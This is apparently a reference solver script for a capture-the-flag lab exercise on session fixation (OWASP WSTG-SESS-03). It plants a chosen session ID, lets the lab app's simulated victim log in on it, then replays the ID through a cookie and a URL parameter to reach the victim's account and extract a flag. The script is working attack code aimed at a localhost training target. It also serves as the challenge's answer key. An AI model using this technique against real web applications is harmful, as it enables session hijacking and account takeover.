#!/usr/bin/env python3
"""Masquerade Operation 02 reference solver -- Zero routes a key card to R. Voss.

WSTG-SESS-03: Testing for Session Fixation. Two roles, played by two different parties:

  Phase 1 (attacker)  -- choose a card number yourself, before anyone checks in.
  Phase 2 (R. Voss)   -- the front desk hands that exact card to R. Voss, Meridian's
                         regional director. Voss checks in with Voss's OWN real password --
                         a password this script (and the player) never sees and never needs.
  Phase 3 (attacker)  -- come back in a request that has NEVER logged in -- no username,
                         no password, nothing but the card from Phase 1 -- and reach Voss's
                         authenticated reservation anyway. THIS is the step that proves the
                         bug: every other request in this script that touches an account
                         belongs to Voss, submitted by the app itself, never by this script.

Also demonstrates the secondary WSTG-SESS-03 checklist item: the session identifier is
accepted just as readily via a `?guest_sid=` URL parameter as it is via the cookie.

Usage: python3 solver.py [base_url]     (default http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")


def main():
    print("[*] Path 1 -- cookie-based fixation")
    planted_card = "PWNED-BY-ZERO-4471"

    print(f"[*] Phase 1 (attacker) -- choosing a card number ourselves: {planted_card!r}")

    print(f"[*] Phase 2 (R. Voss)  -- routing that card to the front desk; Voss checks in with Voss's own password")
    r = requests.post(f"{BASE}/masquerade/op2/send-link", data={"sid": planted_card})
    delivered = "delivered" in r.text.lower()
    print(f"    front desk confirms delivery: {delivered} (this script never submits a Voss credential -- it can't, it doesn't have one)")

    print("[*] Phase 3 (attacker) -- a brand-new request, NO prior state, NO credentials at all,")
    print("    just replaying the card from Phase 1 straight to the reservations page")
    res = requests.get(f"{BASE}/masquerade/op2/reservations", cookies={"guest_sid": planted_card})
    flag = re.search(r"R6S\{[^}]*\}", res.text)
    if flag:
        print(f"[+] Voss's authenticated account reached with zero credentials submitted in this request: {flag.group(0)}")
    else:
        print(f"[!] planted card was not accepted (HTTP {res.status_code})")

    print("\n[*] Path 2 -- secondary finding: same two roles, via URL parameter instead of a cookie")
    card_via_url = "URL-PLANTED-9999"

    print(f"[*] Phase 1 (attacker) -- a card delivered as a URL parameter this time: ?guest_sid={card_via_url}")
    print(f"[*] Phase 2 (R. Voss)  -- front desk routes it, Voss checks in with Voss's own password")
    requests.post(f"{BASE}/masquerade/op2/send-link", data={"sid": card_via_url})

    print("[*] Phase 3 (attacker) -- again, a fresh request with no credentials at all")
    res2 = requests.get(f"{BASE}/masquerade/op2/reservations?guest_sid={card_via_url}")
    flag2 = re.search(r"R6S\{[^}]*\}", res2.text)
    print(f"[{'+' if flag2 else '!'}] URL-parameter-planted card accepted, no credentials needed: {bool(flag2)}")

    print("\n[*] Sanity check -- logging into YOUR OWN account on a self-planted card does NOT win")
    print("    (that shortcut was removed on purpose: it never proved anyone else's login was hijacked)")
    self_card = "SELF-LOGIN-SHOULD-NOT-WIN"
    s = requests.Session()
    s.get(f"{BASE}/masquerade/op2/", cookies={"guest_sid": self_card})
    s.post(f"{BASE}/masquerade/op2/login", cookies={"guest_sid": self_card},
           data={"username": "guest.stay", "password": "Meridian2024!"})
    res3 = requests.get(f"{BASE}/masquerade/op2/reservations", cookies={"guest_sid": self_card})
    flag3 = re.search(r"R6S\{[^}]*\}", res3.text)
    print(f"[{'!' if flag3 else '+'}] self-login on a planted card awarded the flag: {bool(flag3)} (expected: False)")


if __name__ == "__main__":
    main()
